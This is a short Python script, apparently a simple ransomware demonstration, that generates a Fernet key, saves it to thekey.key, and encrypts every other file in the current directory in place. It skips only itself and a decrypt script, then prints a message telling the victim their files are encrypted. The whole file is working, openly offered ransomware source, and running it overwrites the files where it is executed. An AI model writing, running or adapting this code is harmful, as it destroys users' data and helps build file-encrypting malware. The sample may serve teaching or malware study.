import os
import logging
from cryptography.fernet import Fernet

# Configure logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

def find_files():
    """Find all non-excluded files in the current directory."""
    excluded_files = {"ransomware.py", "thekey.key", "decrypt.py"}
    return [f for f in os.listdir() if os.path.isfile(f) and f not in excluded_files]

def generate_key():
    """Generate and securely store an encryption key."""
    key = Fernet.generate_key()
    with open("thekey.key", "wb") as key_file:
        key_file.write(key)
    return key

def encrypt_files(files, key):
    """Encrypt the given files using the provided key."""
    cipher = Fernet(key)
    for file in files:
        with open(file, "rb") as f:
            file_data = f.read()
        encrypted_data = cipher.encrypt(file_data)
        with open(file, "wb") as f:
            f.write(encrypted_data)
    logging.info(f"Encrypted Files: {files}")

def main():
    files = find_files()
    key = generate_key()
    encrypt_files(files, key)
    print("All of your files have been encrypted!! Find the magic word to decrypt them.")

if __name__ == "__main__":
    main()
